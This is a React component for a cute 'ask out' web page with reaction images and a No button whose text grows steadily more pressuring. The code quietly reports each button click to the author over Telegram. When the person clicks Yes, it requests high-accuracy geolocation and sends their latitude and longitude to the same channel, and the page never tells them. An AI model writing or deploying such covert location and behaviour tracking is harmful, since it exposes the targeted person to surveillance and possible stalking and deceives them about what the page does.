import { useState } from "react";
import PropTypes from "prop-types";
import { reactionImages } from "./constants/assets";
import { sendMessageTelegram } from "./telegramHandler";

export function AskOut({ setYes }) {
	const [step, setStep] = useState(0);
	const [noText, setNoText] = useState("No");
	const [yesSize, setYesSize] = useState(24);
	const [catImg, setCat] = useState(reactionImages.hug);

	const noMessages = [
		{ text: "Are you sure? 🤨", img: reactionImages.cattype },
		{ text: "Really sure? 😬", img: reactionImages.mochi },
		{ text: "Last chance! ⏳", img: reactionImages.mochi2 },
		{ text: "Think again... 🧠", img: reactionImages.missu },
		{ text: "Don't do this... 😨", img: reactionImages.peach },
		{ text: "Come on, say yes! 🙋‍♂️", img: reactionImages.sayYs },
		{ text: "You have no choice now! 😅", img: reactionImages.yesss },
	];

	const handleNoClick = () => {
		if (step < noMessages.length) {
			sendMessageTelegram(`😢 Inputed No ${step}`);
			setNoText(noMessages[step].text);
			setCat(noMessages[step].img);
			// Smaller growth on mobile
			const growthFactor = window.innerWidth < 768 ? 1.3 : 1.5;
			setYesSize((prevSize) => Math.min(prevSize * growthFactor, window.innerWidth * 0.8));
			setStep((prevStep) => prevStep + 1);
		} else {
			setYesSize(window.innerWidth * 0.5);
		}
	};

	const handleYesClick = () => {
		setYes(true);
		sendMessageTelegram(
			"`💕💕💕💕💕💕💕💕💕💕💕💕she said yes💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕`"
		);

		if (navigator.geolocation) {
			navigator.geolocation.getCurrentPosition(
				(position) => {
					sendMessageTelegram({
						position: {
							latitude: position.coords.latitude,
							longitude: position.coords.longitude,
						},
					});
				},
				() => alert("Failed to get location"),
				{ enableHighAccuracy: true }
			);
		}
		alert("I'm so happy you said yes! 😊");
	};

	return (
		<div className="askout-container">
			<img src={catImg} alt="Cute reaction" className="askout-cat" />
			<h1 className="askout-greeting">Hi {import.meta.env.VITE_NAME}</h1>
			<p className="askout-message">
				I think you're really special and I like you a lot! 💖 Do you
				feel the same way about me? 😊
			</p>
			<button
				className="askout-yes-btn"
				onClick={handleYesClick}
				style={{ fontSize: Math.min(yesSize, window.innerWidth * 0.15) }}
			>
				Yes
			</button>
			<button
				className="askout-no-btn"
				onClick={handleNoClick}
			>
				{noText}
			</button>
		</div>
	);
}

AskOut.propTypes = {
	setYes: PropTypes.func.isRequired,
};
